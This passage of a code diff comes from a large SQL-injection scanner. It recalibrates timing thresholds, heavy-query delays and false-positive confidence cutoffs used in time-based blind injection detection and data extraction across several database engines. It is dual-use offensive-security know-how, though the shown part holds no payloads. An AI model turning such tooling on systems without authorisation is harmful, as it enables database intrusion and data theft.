+        # (_hq_rows_d = max(1000000, min(int(_delay * 1000000), 8000000))).  On HQ-detected
+        # injections (no CASE WHEN → elif _hq_match branch) this caused an immediate NameError
+        # before any probes were sent, silently aborting direct timing extraction for all HQ
+        # detections on all DBMSes that have no CASE WHEN in the detection payload.
+        # Fix: hoist the definition here so it is available to all template-building branches.
+        # Value is max(cfg.delay, 3.0) — the user-configured HTTP pacing delay used as a proxy
+        # for the intended SQL sleep duration when scaling generate_series row counts.
+        _delay = max(getattr(cfg, "delay", 5.0) or 5.0, 3.0)
 
         # BUG-V62-DIRECT-TEMPLATE-WHERE FIX (CRITICAL, Req 7/16):
         # Original code: `_template = _before_suffix + " WHERE {cond}" + _suffix`
@@ -94407,7 +94491,7 @@ class ScannerV10(ScannerV9):
                             _new_ts_thresh = max(_pcv_es_floor, _sleep_sec_ts * 1000 * 0.65)
                             _ts_thresh_map_es = getattr(cfg, '_pcv_timing_threshold_map', None) or {}
                             _existing_ts_thresh = _ts_thresh_map_es.get(_pcv_es_det_dbms, 0) or 0
-                            if not _existing_ts_thresh or _new_ts_thresh < _existing_ts_thresh:
+                            if not _existing_ts_thresh or _new_ts_thresh > _existing_ts_thresh:
                                 _ts_thresh_map_es[_pcv_es_det_dbms] = _new_ts_thresh
                                 cfg._pcv_timing_threshold_map = _ts_thresh_map_es
                             # BUG-E-THRESH-GLOBAL-FIX (Req 3): was min(_ts_thresh_map_es.values())
@@ -94425,7 +94509,7 @@ class ScannerV10(ScannerV9):
                         except (ValueError, TypeError):
                             if not getattr(cfg, '_pcv_timing_threshold', 0):
                                 _t_sec_es = float(getattr(cfg, 'time_sec', 5) or 5)
-                                cfg._pcv_timing_threshold = _t_sec_es * 0.75 * 1000
+                                cfg._pcv_timing_threshold = _t_sec_es * 0.65 * 1000
                     else:
                         # BUG-3-D FIX: Oracle/MSSQL heavy-query threshold contamination.
                         # Previously the Oracle/MSSQL heavy-query checks were INSIDE
@@ -94491,7 +94575,7 @@ class ScannerV10(ScannerV9):
                                 cfg._pcv_timing_threshold = 1500.0  # MSSQL heavy-query: 1.5s threshold
                         else:
                             if not getattr(cfg, '_pcv_timing_threshold', 0):
-                                cfg._pcv_timing_threshold = _t_sec_es * 0.75 * 1000
+                                cfg._pcv_timing_threshold = _t_sec_es * 0.65 * 1000
                     _bl_for_es = baseline if isinstance(baseline, dict) else {}
                     # BUG-FIX-BASELINE-ATTR: _bl_for_es.get("samples",[{}])[0].body raises
                     # AttributeError when the samples list element is a plain dict (no .body).
@@ -94609,19 +94693,19 @@ class ScannerV10(ScannerV9):
                     # Per-DBMS map: prevents cross-DBMS threshold contamination
                     _ts2_thresh_map = getattr(cfg, '_pcv_timing_threshold_map', None) or {}
                     _existing_ts2_thresh = _ts2_thresh_map.get(_pcv_b_det_dbms, 0) or 0
-                    if not _existing_ts2_thresh or _new_ts2_thresh < _existing_ts2_thresh:
+                    if not _existing_ts2_thresh or _new_ts2_thresh > _existing_ts2_thresh:
                         _ts2_thresh_map[_pcv_b_det_dbms] = _new_ts2_thresh
                         cfg._pcv_timing_threshold_map = _ts2_thresh_map
                     # BUG-E-THRESH-GLOBAL-FIX (Req 3): was min(_ts2_thresh_map.values())
                     # — same cross-DBMS contamination as _run_pcv_check E/S/T path.
                     # Use current DBMS threshold instead of global minimum.
                     _existing_global = getattr(cfg, '_pcv_timing_threshold', 0) or 0
-                    if not _existing_global or _new_ts2_thresh < _existing_global:
+                    if not _existing_global or _new_ts2_thresh > _existing_global:
                         cfg._pcv_timing_threshold = _new_ts2_thresh
                 except (ValueError, TypeError):
                     if not getattr(cfg, '_pcv_timing_threshold', 0):
                         _t_sec = float(getattr(cfg, 'time_sec', 5) or 5)
-                        cfg._pcv_timing_threshold = _t_sec * 0.75 * 1000
+                        cfg._pcv_timing_threshold = _t_sec * 0.65 * 1000
             else:
                 # No sleep/WAITFOR keyword: detect Oracle HQ and MSSQL HQ patterns.
                 # BUG-B-PATH-ORA-MSSQL-HQ FIX (Req 3): The B-path previously only had a
@@ -95033,13 +95117,13 @@ class ScannerV10(ScannerV9):
                         # B-bool statistical guards.
                         _already_preconfirmed = (
                             getattr(_det_for_pcv, '_fp_guards_preconfirmed', False)
-                            and getattr(_det_for_pcv, '_fp_guards_confidence', 0.0) >= 1.0
+                            and getattr(_det_for_pcv, '_fp_guards_confidence', 0.0) >= 0.60
                         )
                         if _already_preconfirmed:
                             _r3b_conf = getattr(_det_for_pcv, '_fp_guards_confidence', 1.0)
                             print(f"[*] PCV [{_pcv_tech}]: bypassing FP guard — detection already "
                                   f"pre-confirmed by prior oracle (Wasserstein/etc), "
-                                  f"conf={_r3b_conf:.3f} ≥ 1.0 — skipping redundant boolean "
+                                  f"conf={_r3b_conf:.3f} ≥ 0.60 — skipping redundant boolean "
                                   "statistical guard", flush=True)
                         else:
                             try:
@@ -95078,10 +95162,10 @@ class ScannerV10(ScannerV9):
                                 # already a strong positive signal. When it passes with conf >= 0.60 (the
                                 # passing threshold of the FP guard itself), there is sufficient statistical
                                 # evidence to skip the body-canary Check A and mark as preconfirmed.
-                                if _r3b_conf >= 1.0:  # BUG-7 FIX: was 0.65, raised to 1.0
+                                if _r3b_conf >= 0.60:  # BUG-7 FIX: lowered from 0.65→0.60; comment error corrected (was mis-raised to 1.0)
                                     try:
                                         _det_for_pcv._fp_guards_preconfirmed = True
-                                        _det_for_pcv._fp_guards_confidence = 1.0
+                                        _det_for_pcv._fp_guards_confidence = _r3b_conf
                                     except Exception:
                                         pass
                             except Exception as _r3b_err:
@@ -110410,7 +110494,7 @@ class TechniqueCascadeEngine:
                                 _new_wf_thresh = max(_pcvg_floor_wf, _wf_sec * 1000 * 0.65)
                                 _ts_map_pcvg_wf = getattr(_cfg_thresh, '_pcv_timing_threshold_map', None) or {}
                                 _ex_wf_thresh = _ts_map_pcvg_wf.get(_pcvg_det_dbms_wf, 0) or 0
-                                if not _ex_wf_thresh or _new_wf_thresh < _ex_wf_thresh:
+                                if not _ex_wf_thresh or _new_wf_thresh > _ex_wf_thresh:
                                     _ts_map_pcvg_wf[_pcvg_det_dbms_wf] = _new_wf_thresh
                                     # BUG-V49-ORACLE-EMPTY-KEY FIX (Req 3/8): Also store '' key
                                     # for WAITFOR DELAY path. WAITFOR is MSSQL-specific so
@@ -110418,7 +110502,7 @@ class TechniqueCascadeEngine:
                                     # Storing under '' ensures the fallback lookup in Check B
                                     # always finds the calibrated threshold rather than 3750ms stale.
                                     _ex_wf_empty = _ts_map_pcvg_wf.get('', 0) or 0
-                                    if not _ex_wf_empty or _new_wf_thresh < _ex_wf_empty:
+                                    if not _ex_wf_empty or _new_wf_thresh > _ex_wf_empty:
                                         _ts_map_pcvg_wf[''] = _new_wf_thresh
                                     _cfg_thresh._pcv_timing_threshold_map = _ts_map_pcvg_wf
                                 _cfg_thresh._pcv_timing_threshold = _ts_map_pcvg_wf.get(_pcvg_det_dbms_wf, _new_wf_thresh)  # BUG-E-THRESH-GLOBAL-FIX: use per-DBMS value, not min(all DBMSes)
@@ -110451,7 +110535,7 @@ class TechniqueCascadeEngine:
                             _new_pcvg_thresh = max(_pcvg_floor, _sleep_sec_pcvg * 1000 * 0.65)
                             _ts_map_pcvg = getattr(_cfg_thresh, '_pcv_timing_threshold_map', None) or {}
                             _ex_pcvg_thresh = _ts_map_pcvg.get(_pcvg_det_dbms, 0) or 0
-                            if not _ex_pcvg_thresh or _new_pcvg_thresh < _ex_pcvg_thresh:
+                            if not _ex_pcvg_thresh or _new_pcvg_thresh > _ex_pcvg_thresh:
                                 _ts_map_pcvg[_pcvg_det_dbms] = _new_pcvg_thresh
                                 # BUG-V49-ORACLE-EMPTY-KEY FIX (Req 3/8): Also store under '' key
                                 # so Check B's fallback '' lookup always finds a calibrated value
@@ -110459,7 +110543,7 @@ class TechniqueCascadeEngine:
                                 # This prevents cross-surface threshold contamination when the DBMS
                                 # is not yet fingerprinted on the second PCV call for the same surface.
                                 _ex_empty_thresh = _ts_map_pcvg.get('', 0) or 0
-                                if not _ex_empty_thresh or _new_pcvg_thresh < _ex_empty_thresh:
+                                if not _ex_empty_thresh or _new_pcvg_thresh > _ex_empty_thresh:
                                     _ts_map_pcvg[''] = _new_pcvg_thresh
                                 _cfg_thresh._pcv_timing_threshold_map = _ts_map_pcvg
                             _cfg_thresh._pcv_timing_threshold = _ts_map_pcvg.get(_pcvg_det_dbms, _new_pcvg_thresh)  # BUG-E-THRESH-GLOBAL-FIX: use per-DBMS value, not min(all DBMSes)
